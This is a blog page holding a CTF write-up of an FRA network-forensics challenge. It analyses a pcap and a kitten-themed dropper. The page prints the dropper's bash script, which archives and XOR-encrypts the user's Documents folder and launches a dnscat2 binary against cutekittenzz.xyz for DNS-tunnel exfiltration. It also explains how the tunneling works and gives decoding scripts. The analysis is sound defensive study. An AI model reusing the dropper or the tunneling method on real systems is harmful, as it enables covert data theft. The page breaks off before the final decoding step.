<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>FRA Kattastrofen :: Jens Jonsson Portfolio</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="My writeup for FRA:s Kattastrofen challange. Only managed 2 flags." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/posts/challanges_flags/fra_kattastrofen/" />





  
  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="FRA Kattastrofen">
<meta property="og:description" content="My writeup for FRA:s Kattastrofen challange. Only managed 2 flags." />
<meta property="og:url" content="http://localhost:1313/posts/challanges_flags/fra_kattastrofen/" />
<meta property="og:site_name" content="Jens Jonsson Portfolio" />

  <meta property="og:image" content="http://localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2026-02-22 00:00:00 &#43;0000 UTC" />












</head>
<body>


<div class="container full">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="http://localhost:1313/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/">About</a></li>
        
      
        
          <li><a href="/posts/uni_projects/">University Projects</a></li>
        
      
        
          <li><a href="/posts/challanges_flags/">Challenges and Flags</a></li>
        
      
        
          <li><a href="https://www.linkedin.com/in/jonssonjens/">LinkedIn</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/" >About</a></li>
        
      
        
          <li><a href="/posts/uni_projects/" >University Projects</a></li>
        
      
        
          <li><a href="/posts/challanges_flags/" >Challenges and Flags</a></li>
        
      
        
          <li><a href="https://www.linkedin.com/in/jonssonjens/" >LinkedIn</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/challanges_flags/fra_kattastrofen/">FRA Kattastrofen</a>
  </h1>
  <div class="post-meta"><time class="post-date">2026-02-22</time></div>

  
  


  

  <div class="post-content"><div>
        <blockquote>
<p>En statstjänsteman på en skyddsvärd myndighet är svag för bilder på kattungar.
I sin iver att ta del av fler sådana bilder, har hen råkat ladda ned något som
inte var bra. Inte alls bra. Vi misstänker att skadlig kod har använts för att
exfiltrera topphemlig data från myndigheten. Analysera nätverkstrafiken för att
ta reda på vad som har hänt.</p>
<p>Utmaningen innehåller tre flaggor på formen /flagga[1-3]{[a-zå-ö0-9_!]+}/ - kan
du hitta dem?</p>
<p>Skicka in din lösning till <a href="mailto:rekrytering@fra.se">rekrytering@fra.se</a>, även om du inte lyckas hitta
samtliga flaggor!</p>
</blockquote>
<h1 id="first-flag">First flag<a href="#first-flag" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>The first flag was found using the hint provided in the challenge description. A public servant had downloaded malware he believed to be pictures of cats. Based on that, I decided to inspect the downloaded files in Wireshark.</p>
<p><img src="/FRA_Kattastrofen/malwaredownloade.png" alt="The downloaded files"></p>
<p>As shown in the image above, the ZIP file looked suspicious. I downloaded it and discovered that it was password protected.</p>
<p>My first instinct was to use <code>John the Ripper</code>, so I started setting up <code>zip2john</code> on my SIFT machine. However, after cloning the required GitHub repositories, I ran into multiple dependency issues and missing libraries. Rather than troubleshooting all of that, I took a lazier approach.</p>
<p>I searched the packet capture for frames containing the string <code>pass</code> and it worked.</p>
<p><img src="/FRA_Kattastrofen/zippassword.png" alt="Found zip password"></p>
<p>Inside the archive, there was a file named <code>flag</code> containing the flag:</p>
<p><code>flagga1{klassiska_lösenord_för_100}</code></p>
<h1 id="second-flag">Second Flag<a href="#second-flag" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>After extracting the ZIP file, I noticed that every image had a thumbnail except number 3. That immediately felt suspicious.</p>
<p>Using the terminal and listing the files with the <code>ls</code> command also revealed that this file was executable. To confirm what it actually was, I used the <code>file</code> command.</p>
<p><img src="/FRA_Kattastrofen/suspiciouskittenimage.png" alt="Suspicious kitten PNG in terminal"></p>
<p>Aha! It turned out to be a shell script. This was most likely the downloaded malware.</p>
<p>Inspecting the Bash script showed that it contained a Base64-encoded key as well as Base64-encoded data. The script decodes the data and writes it to a file named <code>mjau</code>, then makes that file executable using the <code>chmod +x</code> command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>D<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>dirname <span style="color:#e6db74">&#34;</span>$0<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>eog <span style="color:#e6db74">&#34;</span>$D<span style="color:#e6db74">/kitten-9.jpg&#34;</span> &amp;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=&#34;</span>
</span></span><span style="display:flex;"><span>echo $key |base64 -d &gt; /tmp/key
</span></span><span style="display:flex;"><span>tar cf - $HOME/Documents &gt; /tmp/exfil.tar
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;EXFIL </span><span style="color:#66d9ef">$(</span>date<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;SIZE: </span><span style="color:#66d9ef">$(</span>stat -c%s /tmp/exfil.tar<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>md5sum /tmp/exfil.tar &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;BEGIN DATA&#34;</span> &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>paste &lt;<span style="color:#f92672">(</span>od -An -vtu1 -w1 /tmp/exfil.tar<span style="color:#f92672">)</span> &lt;<span style="color:#f92672">(</span><span style="color:#66d9ef">while</span> :; <span style="color:#66d9ef">do</span> od -An -vtu1 -w1 /tmp/key; <span style="color:#66d9ef">done</span><span style="color:#f92672">)</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | LC_ALL<span style="color:#f92672">=</span>C awk <span style="color:#e6db74">&#39;NF!=2{exit}; {printf &#34;%c&#34;, xor($1, $2)}&#39;</span> | base64 &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;END DATA&#34;</span> &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base64 -d &gt; mjau <span style="color:#e6db74">&lt;&lt; &#39;EOM&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgCkAAAAAAABAAAAAAAAAACgrBQAAAAAAAAAAAEAAOAAN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AEAAJgAlAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAbAAAAAAAAoBsAAAAAAAAAEAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAAAAAEAAAAFAAAAACAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAaQBAAAAAAABpAEAAAAAAAAQAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAAAAQAAAAQAAAAA0AEAAAAAAADQAQAAAAAAANABAAAAAAC4fgAAAAAAALh+AAAAAAAAABAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAABAAAABgAAABBXAgAAAAAAEGcCAAAAAAAQZwIAAAAAAFAMAAAAAAAAAA0AAAAAAAAAEAAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAIAAAAGAAAAaFsCAAAAAABoawIAAAAAAGhrAgAAAAAA8AEAAAAAAADwAQAAAAAAAAgAAAAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOM</span>
</span></span><span style="display:flex;"><span>chmod +x mjau
</span></span><span style="display:flex;"><span>./mjau cutekittenzz.xyz
</span></span></code></pre></div><p>Decoding the long block of data with <code>base64 -d &lt; mjauB64 &gt; mjau</code> produced an <code>ELF</code> binary.</p>
<p>After loading it into Ghidra, I noticed a lot of references to <code>dns</code> and general network activity. I did not fully understand the entire control flow, but it seemed unnecessary to reverse engineer the whole program. The presence of functions such as <code>can_i_transmit_yet</code> and <code>you_can_transmit_now</code> strongly suggested that it was establishing some kind of communication channel.</p>
<p>I also found several references to <code>dnscat</code>. Inspecting the <code>usage</code> function appeared to confirm that this was indeed a <code>dnscat2</code> binary.</p>
<p><img src="/FRA_Kattastrofen/dnscatusage.png" alt="dnscat2 usage function"></p>
<p>Looking at the the documentation by Kali for <code>dnscat2</code> shows that it establishes an encrypted command-and-control channel over the DNS protocol. That aligns well with the DNS-related artifacts observed in the binary.</p>
<blockquote>
<h1 id="dnscat2">dnscat2<a href="#dnscat2" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>This tool is designed to create an encrypted command-and-control (C&amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network.</p>
</blockquote>
<p>The <code>dnscat2</code> binary was executed with the domain <code>cutekittenzz.xyz</code> as its argument:</p>
<p><code>./mjau cutekittenzz.xyz</code></p>
<p>This aligns with the DNS packets being sent immediately after the malware was downloaded.</p>
<p><img src="/FRA_Kattastrofen/dnsAfterMalwareDownload.png" alt="DNS protocol packets being sent after malware was downloaded"></p>
<p>Inspecting the DNS traffic shows that <code>cutekittenzz.xyz</code> is heavily referenced.</p>
<p><img src="/FRA_Kattastrofen/cutekittenzzIN_DNS.png" alt="cutekittenzz.xyz in dns packets"></p>
<h1 id="my-understanding-of-dnscat2-and-the-bash-script">My understanding of dnscat2 and the Bash script<a href="#my-understanding-of-dnscat2-and-the-bash-script" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>To be honest, my Bash skills are not the strongest, and I had never heard of <code>dnscat2</code> before this challenge. The following section reflects my understanding of the script and <code>dnscat2</code> after doing some research.</p>
<h2 id="dnscat2-1">dnscat2<a href="#dnscat2-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><code>dnscat2</code> is a tool used to establish an encrypted command-and-control (C2) channel over the DNS protocol. Since most networks allow DNS traffic and often do not monitor it closely, DNS can be abused to create a covert remote connection or to exfiltrate data. This technique is commonly referred to as <strong>DNS tunneling</strong>, and <code>dnscat2</code> is an implementation of that technique.</p>
<h3 id="how-dns-tunneling-works">How DNS tunneling works<a href="#how-dns-tunneling-works" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>DNS tunneling works by encoding data inside DNS queries. These queries are sent to an attacker-controlled DNS server. A typical <code>dnscat2</code> query might look like:</p>
<p><code>&lt;encoded_request&gt;.hacker.com</code> with record type <code>MX</code> (Mail Exchange).</p>
<p>When the malware sends this query, the local DNS resolver does not know the <code>MX</code> record for <code>&lt;encoded_request&gt;.hacker.com</code>. It then follows the normal DNS resolution process:</p>
<ol>
<li>The resolver queries a <strong>root nameserver</strong> to determine which servers are responsible for the <code>.com</code> top-level domain (TLD).</li>
<li>The root server responds with <code>NS</code> records for the <code>.com</code> TLD servers.</li>
<li>The resolver queries a <code>.com</code> TLD server to determine which authoritative nameservers are responsible for <code>hacker.com</code>.</li>
<li>The TLD server responds with <code>NS</code> records for the authoritative nameservers of <code>hacker.com</code>.</li>
<li>Finally, the resolver queries the authoritative nameserver for <code>hacker.com</code>.</li>
</ol>
<p>The critical detail is that the authoritative nameserver for <code>hacker.com</code> is attacker-controlled. When the query requests the <code>MX</code> record for <code>&lt;encoded_request&gt;.hacker.com</code>, the attacker-controlled server responds with something like:</p>
<p><code>&lt;encoded_response&gt;.hacker.com</code></p>
<p>That response propagates back through the DNS hierarchy to the infected host. The malware then decodes <code>&lt;encoded_response&gt;</code>, which may contain commands, acknowledgments, or other data. The malware can also exfiltrate data simply by embedding it in outgoing DNS queries, without necessarily expecting meaningful responses.</p>
<h3 id="dnscat2-packet-structure">dnscat2 packet structure<a href="#dnscat2-packet-structure" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p><code>dnscat2</code> uses a session-oriented communication model similar to TCP, with <code>SYN</code>-like packets to establish a session and <code>FIN</code>-like packets to terminate it.</p>
<p>For a <code>SYN</code> packet, the encoded payload structure is:</p>
<ol>
<li>Packet ID (16 bits)</li>
<li>Message Type (8 bits, <code>0x00</code>)</li>
<li>Session ID (16 bits)</li>
<li>Initial sequence number (16 bits)</li>
<li>Options (16 bits)</li>
<li>Optional additional data if <code>OPT_NAME</code> is set</li>
</ol>
<p>For a message packet, the structure is:</p>
<ol>
<li>Packet ID (16 bits)</li>
<li>Message Type (8 bits, <code>0x01</code>)</li>
<li>Session ID (16 bits)</li>
<li>Sequence number (16 bits)</li>
<li>Acknowledgment number (16 bits)</li>
<li>Message data</li>
</ol>
<p>From this, I concluded that the first 9 bytes of the encoded DNS subdomain represent control and session metadata. If I want to extract the actual message content, I need to:</p>
<ul>
<li>Identify packets where the third byte (Message Type) is <code>0x01</code>, indicating a message packet.</li>
<li>Extract the bytes following the initial 9-byte header, as those contain the message data.</li>
</ul>
<h2 id="the-bash-script">The bash script<a href="#the-bash-script" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>With some help from google and chatgpt about the weird <code>paste</code>, loop part thing syntax this is how I understand the bash script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>D<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>dirname <span style="color:#e6db74">&#34;</span>$0<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span> <span style="color:#75715e">#Get directory from where script is running from. </span>
</span></span><span style="display:flex;"><span>eog <span style="color:#e6db74">&#34;</span>$D<span style="color:#e6db74">/kitten-9.jpg&#34;</span> &amp; <span style="color:#75715e">#Open kitten-9.jpg (user pressed kitten 11 so trick him) in Eye of Gnome and continue with the commands below.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=&#34;</span> <span style="color:#75715e">#Key used for simple repeated key xor later. </span>
</span></span><span style="display:flex;"><span>echo $key |base64 -d &gt; /tmp/key <span style="color:#75715e">#decode key and store in a temp key file</span>
</span></span><span style="display:flex;"><span>tar cf - $HOME/Documents &gt; /tmp/exfil.tar <span style="color:#75715e">#compress the users documents folder using tar into a exfil.tar file</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;EXFIL </span><span style="color:#66d9ef">$(</span>date<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; /tmp/exfil.dat <span style="color:#75715e">#create a exfil.dat file and put the date in the file.</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;SIZE: </span><span style="color:#66d9ef">$(</span>stat -c%s /tmp/exfil.tar<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt;&gt; /tmp/exfil.dat <span style="color:#75715e">#append the size of the tar file to the exfil.dat.</span>
</span></span><span style="display:flex;"><span>md5sum /tmp/exfil.tar &gt;&gt; /tmp/exfil.dat <span style="color:#75715e">#calc the md5 hash of the tar and append to exfil.dat</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;BEGIN DATA&#34;</span> &gt;&gt; /tmp/exfil.dat <span style="color:#75715e">#appened a line that says that the data now starts</span>
</span></span></code></pre></div><p>The loop needs it own explanation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paste &lt;<span style="color:#f92672">(</span>od -An -vtu1 -w1 /tmp/exfil.tar<span style="color:#f92672">)</span> &lt;<span style="color:#f92672">(</span><span style="color:#66d9ef">while</span> :; <span style="color:#66d9ef">do</span> od -An -vtu1 -w1 /tmp/key; <span style="color:#66d9ef">done</span><span style="color:#f92672">)</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | LC_ALL<span style="color:#f92672">=</span>C awk <span style="color:#e6db74">&#39;NF!=2{exit}; {printf &#34;%c&#34;, xor($1, $2)}&#39;</span> | base64 &gt;&gt; /tmp/exfil.dat
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;END DATA&#34;</span> &gt;&gt; /tmp/exfil.dat
</span></span></code></pre></div><p><code>od -An -vtu1 -w1 /tmp/exfil.tar</code> is used to display the <code>exfil.tar</code> file as an octaldump, basically displaying the bytes ocatl. The command arguments used</p>
<ul>
<li><code>-An</code> removes the offset information so only the bytes are shown in octal.</li>
<li><code>-v</code> includes duplicate values, <code>-vtu1</code> includes duplicate values and specifies an output format of an <code>unsigned decimal</code> 1 byte at a time. Basically print <code>0-255 *space* next value between 0-255</code> and so on.</li>
<li><code>-w1</code> says to output 1 byte per line.<br>
This output ends up lookings something along the lines of:</li>
</ul>
<pre tabindex="0"><code> 110
 115
  47
  34
  10
  32
  32
</code></pre><p>The same is done for the key file except it is infinitely long because of the while loop.
<code>&lt;(command)</code> is something called <code>process substitution</code>. It allows processes output to appear as a file name. Instead of <code>command file1 file2</code> I could do <code>command1 &lt;(command2) &lt;(command3)</code>. Now <code>command2</code> and <code>command3</code> appears as files that I can use for <code>command1</code>.</p>
<p>What pase <code>paste</code> then does is that it &ldquo;join files horizontally&rdquo;, like this:</p>
<pre tabindex="0"><code>A
B
C
</code></pre><p>AND</p>
<pre tabindex="0"><code>1
2
3
</code></pre><p>Turns into (notice space)</p>
<pre tabindex="0"><code>A 1
B 2
C 3
</code></pre><p>The <code>while</code> loop never terminates, but from what I understood, <code>paste</code> stops once it can no longer match corresponding lines.</p>
<p>The joined lists are then piped into <code>awk</code>, which XORs the values, performing <code>A XOR 1</code>. The result is Base64-encoded and appended to <code>exfil.dat</code>. I do not think it is probably necessary to analyze every parameter of the <code>awk</code> command in detail, so I will skip that part.</p>
<h1 id="back-to-finding-flag-2">Back to finding flag 2<a href="#back-to-finding-flag-2" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Now that I understand the overall workflow — at least at a high level — I can develop a strategy.</p>
<p>This was my plan:</p>
<ol>
<li>Export the queries sent by the infected system separately using <code>tshark</code>.</li>
<li>Export the responses received from the compromised authoritative nameserver separately.</li>
<li>Write a Python script to extract the encoded portion.</li>
<li>Remove the first 9 bytes from each message.</li>
<li>Decode the remaining data from hex to a string.</li>
<li>Locate the Base64-encoded message and decode it.</li>
<li>Apply the previously recovered key in the same manner it was originally used for encryption.</li>
</ol>
<h2 id="step-1-and-2">Step 1 and 2<a href="#step-1-and-2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>These steps were completed using:</p>
<p><code>tshark -r kattastrofen.pcap -Y &quot;dns &amp;&amp; ip.src==[VICTIM OR ATTACKER]&quot; -T fields -e &quot;dns.qry.name&quot; &gt; [VICTIM OR ATTACKER]</code></p>
<p>I also noticed that each DNS packet could contain multiple encoded segments separated by dots.</p>
<p>After experimenting with an online decoder, I discovered that only the first segment needs to have its initial 9 bytes removed. The remaining segments can be decoded directly without stripping any additional header bytes.</p>
<h2 id="step-3-4-and-5">Step 3, 4, and 5<a href="#step-3-4-and-5" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Initially, I thought I would need to explicitly identify the byte indicating a message packet (<code>0x01</code>), but the extraction process worked without doing so.</p>
<p>Interestingly, the <code>dnscat2</code> data in this case did not appear to be encrypted.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>victim <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;victim&#34;</span>)
</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;server&#34;</span>)
</span></span><span style="display:flex;"><span>victim_decoded <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;victimDecoded&#34;</span>,<span style="color:#e6db74">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>server_decoded <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;serverDecoded&#34;</span>,<span style="color:#e6db74">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>victim_lines <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>server_lines <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> victim<span style="color:#f92672">.</span>readlines():
</span></span><span style="display:flex;"><span>    query_parts <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
</span></span><span style="display:flex;"><span>    removed_domain <span style="color:#f92672">=</span> [qp <span style="color:#66d9ef">for</span> qp <span style="color:#f92672">in</span> query_parts <span style="color:#66d9ef">if</span> qp <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;cutekittenzz&#34;</span> <span style="color:#f92672">and</span> qp <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;xyz&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(removed_domain)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                decoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(removed_domain[i][<span style="color:#ae81ff">18</span>:])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#75715e">#Remove communication parts</span>
</span></span><span style="display:flex;"><span>                victim_lines<span style="color:#f92672">.</span>append(decoded)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                decoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(removed_domain[i])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>                victim_lines<span style="color:#f92672">.</span>append(decoded)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>victim_decoded<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(victim_lines))
</span></span><span style="display:flex;"><span>victim_decoded<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> server<span style="color:#f92672">.</span>readlines():
</span></span><span style="display:flex;"><span>    query_parts <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
</span></span><span style="display:flex;"><span>    removed_domain <span style="color:#f92672">=</span> [qp <span style="color:#66d9ef">for</span> qp <span style="color:#f92672">in</span> query_parts <span style="color:#66d9ef">if</span> qp <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;cutekittenzz&#34;</span> <span style="color:#f92672">and</span> qp <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;xyz&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(removed_domain)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                decoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(removed_domain[i][<span style="color:#ae81ff">18</span>:])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#75715e">#Remove communication parts</span>
</span></span><span style="display:flex;"><span>                server_lines<span style="color:#f92672">.</span>append(decoded)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                decoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(removed_domain[i])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>                server_lines<span style="color:#f92672">.</span>append(decoded)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>server_decoded<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(server_lines))
</span></span><span style="display:flex;"><span>server_decoded<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><h2 id="step-6-and-7">Step 6 and 7<a href="#step-6-and-7" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Using nano I removed everything but the base64:ed <code>exfil.tar</code> file and decoded it. I created a python script to xor with the the key that I also decoded:</p>
